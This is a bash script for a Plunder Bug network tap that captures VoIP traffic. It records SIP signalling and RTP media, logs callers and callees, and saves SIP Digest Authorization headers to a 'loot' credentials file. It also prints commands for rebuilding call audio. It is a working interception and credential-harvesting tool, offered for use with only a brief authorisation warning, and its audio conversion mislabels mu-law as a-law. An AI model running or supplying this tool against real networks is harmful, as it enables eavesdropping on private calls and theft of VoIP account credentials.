#!/usr/bin/env bash
# ================================================================
#  Plunder Bug — capture-voip
#  Description : VoIP traffic capture and extraction. Captures SIP
#                signalling (5060/5061/TCP+UDP) and RTP media streams.
#                Extracts caller/callee, SIP credentials (Digest auth),
#                and RTP port ranges for offline media reconstruction.
#                Post-processes with tshark if available.
#  Host OS     : Linux/macOS
#  Requires    : tcpdump (sudo), optionally tshark, sngrep
#  Usage       : sudo ./capture.sh [interface] [duration_seconds]
#  WARNING     : Only use on networks you are authorised to test.
# ================================================================

set -euo pipefail

IFACE="${1:-}"
DURATION="${2:-0}"
LOOT_DIR="./loot/$(date +%Y%m%d_%H%M%S)_voip"
mkdir -p "$LOOT_DIR"

detect_iface() {
    for iface in /sys/class/net/*/address; do
        addr=$(cat "$iface" 2>/dev/null || true)
        [[ "${addr,,}" == 00:13:37* ]] && basename "$(dirname "$iface")" && return
    done
}
[ -z "$IFACE" ] && IFACE=$(detect_iface)
[ -z "$IFACE" ] && { echo "[!] Plunder Bug not found."; exit 1; }

# SIP signalling + RTP media + RTCP
VOIP_FILTER='tcp port 5060 or tcp port 5061 or udp port 5060 or udp port 5061 or
             udp portrange 10000-20000'

VOIP_PCAP="${LOOT_DIR}/voip_capture.pcap"
SIP_FILE="${LOOT_DIR}/sip_signalling.txt"
CRED_FILE="${LOOT_DIR}/sip_credentials.txt"

echo " =================================================="
echo "  Plunder Bug — VoIP Capture"
echo " =================================================="
echo "  Interface : $IFACE"
echo "  Protocols : SIP(5060/5061), RTP(10000-20000)"
echo "  PCAP      : $VOIP_PCAP"
echo " =================================================="
echo ""

# PCAP capture in background
sudo tcpdump -i "$IFACE" -w "$VOIP_PCAP" "$VOIP_FILTER" 2>/dev/null &
PCAP_PID=$!

# Live SIP stream extraction (if tshark available)
if command -v tshark >/dev/null 2>&1; then
    {
        tshark -i "$IFACE" \
            -Y 'sip' \
            -T fields \
            -e frame.time_relative \
            -e ip.src -e ip.dst \
            -e sip.Method -e sip.from.user -e sip.to.user \
            -e sip.r-line \
            -E separator='|' 2>/dev/null | \
        while IFS='|' read -r ts src dst method from to rline; do
            printf "[%s] %-15s -> %-15s  %-10s  FROM:%-20s TO:%s\n" \
                "$ts" "$src" "$dst" "$method" "$from" "$to"
            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$ts" "$src" "$dst" \
                "$method" "$from" "$to" >> "$SIP_FILE"
        done
    } &
    TSHARK_PID=$!
else
    # Fallback: raw ASCII decode for SIP patterns
    {
        sudo tcpdump -i "$IFACE" -A -nn "$VOIP_FILTER" 2>/dev/null | \
        grep -a --line-buffered -iE \
            'INVITE |REGISTER |BYE |ACK |CANCEL |SIP/2\.0|From:|To:|Contact:|Authorization:|WWW-Authenticate:' | \
        while IFS= read -r line; do
            echo "[$(date +%H:%M:%S)] $line" | tee -a "$SIP_FILE"
        done
    } &
    TSHARK_PID=$!
fi

cleanup() {
    kill "$PCAP_PID" "$TSHARK_PID" 2>/dev/null || true
    echo ""
    echo "[+] Capture complete."

    if command -v tshark >/dev/null 2>&1 && [ -f "$VOIP_PCAP" ]; then
        echo "[*] Extracting SIP call summary..."
        tshark -r "$VOIP_PCAP" \
            -Y 'sip.Method == "INVITE"' \
            -T fields \
            -e ip.src -e ip.dst \
            -e sip.from.user -e sip.to.user \
            -e sip.Call-ID \
            2>/dev/null | sort -u > "${LOOT_DIR}/sip_calls.txt"
        CALL_COUNT=$(wc -l < "${LOOT_DIR}/sip_calls.txt" 2>/dev/null || echo 0)
        echo "[+] SIP INVITEs observed: $CALL_COUNT"

        echo "[*] Extracting SIP Digest auth challenges..."
        tshark -r "$VOIP_PCAP" \
            -Y 'sip contains "Authorization:" or sip contains "Proxy-Authorization:"' \
            -T fields \
            -e ip.src -e sip.from.user -e sip.Authorization \
            2>/dev/null > "$CRED_FILE"
        AUTH_COUNT=$(wc -l < "$CRED_FILE" 2>/dev/null || echo 0)
        [ "$AUTH_COUNT" -gt 0 ] && echo "[!] SIP auth headers captured: $AUTH_COUNT (see sip_credentials.txt)"

        echo "[*] Extracting RTP stream inventory..."
        tshark -r "$VOIP_PCAP" \
            -Y 'rtp' \
            -T fields \
            -e ip.src -e ip.dst \
            -e rtp.ssrc -e rtp.payload_type \
            2>/dev/null | sort -u > "${LOOT_DIR}/rtp_streams.txt"
        RTP_COUNT=$(wc -l < "${LOOT_DIR}/rtp_streams.txt" 2>/dev/null || echo 0)
        echo "[+] Unique RTP streams: $RTP_COUNT"

        if [ "$RTP_COUNT" -gt 0 ]; then
            echo ""
            echo "    To reconstruct audio (G.711):"
            echo "    tshark -r $VOIP_PCAP -T fields -e rtp.payload \\"
            echo "        -Y 'rtp.payload_type == 0' | xxd -r -p > audio.raw"
            echo "    # Convert with: sox -r 8000 -e a-law -b 8 -c 1 audio.raw audio.wav"
        fi
    fi
    echo "[+] Full PCAP: $VOIP_PCAP"
}
trap cleanup EXIT INT TERM

[ "$DURATION" -gt 0 ] 2>/dev/null && sleep "$DURATION" && exit 0
wait "$PCAP_PID"
